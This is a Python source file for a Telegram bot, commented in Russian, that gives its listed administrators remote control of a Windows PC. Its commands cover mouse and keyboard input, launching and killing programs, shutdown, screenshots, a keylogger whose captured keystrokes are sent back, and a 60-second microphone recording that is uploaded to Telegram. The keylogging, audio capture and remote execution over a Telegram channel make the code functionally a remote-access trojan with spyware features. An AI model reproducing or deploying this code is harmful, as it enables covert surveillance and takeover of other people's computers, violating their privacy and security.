import os
import telebot
import tempfile
import time
import config
import subprocess
import sys
import pyautogui
import keyboard

from PIL import ImageGrab
from subprocess import Popen
from subprocess import Popen, PIPE

import pyautogui
from PIL import Image, ImageDraw, ImageFont
from io import BytesIO


bot = telebot.TeleBot('TOKEN')

adm = [chat_id, chat_id]

bot.send_message(chat_id='chat_id', text='бот запущен')

@bot.message_handler(commands=['start'])
def welcome(message):
    print(message.chat.id)
    print(message.from_user.first_name, message.from_user.last_name)
    print(message.from_user.username)
    print(message.text)
    print("-------------")
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'ты кто?')
    else:
        bot.send_message(message.chat.id, "привет " + message.from_user.first_name)

@bot.message_handler(commands=['help'])
def help(message):
    help_message = "чтобы запустить программу - нужно прописать польный путь до нее, чтобы закрыть - нужно написать название программы\n\nчтобы открыть ссылку - нужно отправить её боту\n\nНЕЛЬЗЯ ЗАПУСКАТЬ НЕСКОЛЬКО КОМАНД ОДНОВРЕМЕННО, ЕСЛИ СЛУЧАЙНО НАЖАЛ НЕ ТУДА, ТО ДОЖДИСЬ ОКОНЧАНИЯ КОМАНДЫ\n\n"\
                   "список доступных команд:\n\n"\
                   "/move x y - переместить мышь на указанные координаты (x, y)\n\n"\
                   "/click - нажать левую кнопку мыши\n\n"\
                   "/rightclick - нажать правую кнопку мыши\n\n"\
                   "/scroll число - прокрутить колесико мыши на указанное количество шагов (amount)\n\n"\
                   "/doubleclick - двойное нажатие\n\n"\
                   "/text текст который нужно ввести - для ввода в выбранную строку\n\n"\
                   "/enter - нажатие клавиши ентер\n\n"\
                   "/programs - запущенные программы\n\n"\
                   "/screenshot - скриншот экрана\n\n"\
                   "/keylog - запустить кейлогер\n\n"\
                   "/play - запись с микро на 60 сек, запись отправится через 65 сек\n\n"\
                   "/switchoff - выключить пк\n\n"\
                   "/setvolume - от 0% до 100%"
    bot.reply_to(message, help_message)

#выключить
@bot.message_handler(commands=['switchoff'])
def switchoff(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:

        bot.send_message(message.chat.id, 'выключаю...')
        os.system("shutdown /p")
        bot.send_message(message.chat.id, 'выключил')

#запись с микро
@bot.message_handler(commands=['play'])
def play(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        bot.send_message(message.chat.id, 'записываю\nожидай 60 сек')
        import sounddevice as sd
        from scipy.io.wavfile import write
        fs = 44100
        seconds = 60
        myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
        sd.wait()
        write('output.mp3', fs, myrecording)
        output = open('output.mp3', 'rb')
        bot.send_audio(message.chat.id, output)
        output.close()
        os.remove('output.mp3')

#кейлогер
@bot.message_handler(commands=['keylog'])
def keylog(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        bot.send_message(message.chat.id, 'жди 80 сек')
        import keylog
        k=Popen('python keylog.py')
        with open('keylog.txt', 'w', encoding='utf-8') as doc1:
            sys.stdout = doc1
            print("N")
        time.sleep(70)
        doc = open('keylog.txt', 'rb')
        with open("keylog.txt","rb") as misc:
            f=misc.read()
        bot.send_document(message.chat.id, doc)
        doc.close()
        os.remove('keylog.txt')

#скриншот
@bot.message_handler(commands=['screenshot'])
def screenshot(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        screenshot = pyautogui.screenshot()
        mouse_x, mouse_y = pyautogui.position()
        image = Image.frombytes("RGB", screenshot.size, screenshot.tobytes())
        draw = ImageDraw.Draw(image)
        radius = 10
        draw.ellipse((mouse_x - radius, mouse_y - radius, mouse_x + radius, mouse_y + radius), outline="red", width=2)
        font = ImageFont.truetype("font.ttf", 40)
        text = f"Cursor Position: ({mouse_x}, {mouse_y})"
        text_width, text_height = draw.textsize(text, font)
        draw.text((mouse_x - text_width // 2, mouse_y + radius + 5), text, font=font, fill="red")
        image_path = "screenshot.png"
        image.save(image_path)
        with open(image_path, "rb") as file:
            bot.send_photo(message.chat.id, file)
        os.remove(image_path)

#Запущенные программы
@bot.message_handler(commands=['programs'])
def programs(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        bot.send_message(message.chat.id, 'смотрю...\nОжидайте 10 сек')
        import ds
        k=Popen('python ds.py')
        time.sleep(10)
        doc = open('disp.txt', 'rb')
        with open("disp.txt","rb") as misc:
            f=misc.read()
        bot.send_document(message.chat.id, doc)
        doc.close()
        os.remove('disp.txt')
        del ds

#перемещение курсора
@bot.message_handler(commands=['move'])
def move_mouse(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        try:
            _, x, y = message.text.split()
            x, y = int(x), int(y)
            pyautogui.moveTo(x, y)
            bot.reply_to(message, f"мышь перемещена на ({x}, {y})")
        except ValueError:
            bot.reply_to(message, "неправильный формат координат. Используйте команду в формате /move x y")

#ЛКМ
@bot.message_handler(commands=['click'])
def click_mouse(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        pyautogui.click()
        bot.reply_to(message, "нажата левая кнопка мыши")

#ЛКМ 2х
@bot.message_handler(commands=['doubleclick'])
def click_mouse(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        pyautogui.doubleClick()
        bot.reply_to(message, "нажата левая кнопка мыши")

#ПКМ
@bot.message_handler(commands=['rightclick'])
def right_click_mouse(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        pyautogui.rightClick()
        bot.reply_to(message, "нажата правая кнопка мыши")

#текст
@bot.message_handler(commands=['text'])
def text(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        try:
            _, text1 = message.text.split()
            amount = str(text1)
            keyboard.write(text1)
            bot.reply_to(message, f"был введен текст: {text1}")
        except ValueError:
            bot.reply_to(message, "неправильный формат. Используйте команду в формате /text текст")

#enter
@bot.message_handler(commands=['enter'])
def enter(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        pyautogui.press('enter')

#колесико мыши
@bot.message_handler(commands=['scroll'])
def scroll_mouse(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        try:
            _, amount = message.text.split()
            amount = int(amount)
            pyautogui.scroll(amount)
            bot.reply_to(message, f"колесико мыши прокручено на {amount} шагов")
        except ValueError:
            bot.reply_to(message, "неправильный формат количества шагов. Используйте команду в формате /scroll amount")

#громокость
@bot.message_handler(commands=['setvolume'])
def setvolume(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        if len(message.text.split()) < 2:
            bot.send_message(message.chat.id, 'не указано значение громкости')
            return

        volume = int(message.text.split()[1])
        if volume <= 100 and volume >= 0:
            value = int(volume * 655.35)
            os.system(f'nircmd.exe setsysvolume {value}')
            bot.send_message(message.chat.id, f'громкость установлена на {volume}%')
        elif volume > 100:
            bot.send_message(message.chat.id, 'громкость не установлена')
        elif volume < 0:
            bot.send_message(message.chat.id, 'громкость не установлена')

#запуск и закрытие
@bot.message_handler(content_types=['text'])
def text(message):
    if message.chat.id not in adm:
        bot.send_message(message.chat.id, 'не дозволено')
    else:
        while True:
            try:
                os.startfile(message.text)
                break
            except:
                os.system("TASKKILL /F /IM "+message.text)
                break

bot.polling(none_stop=True)
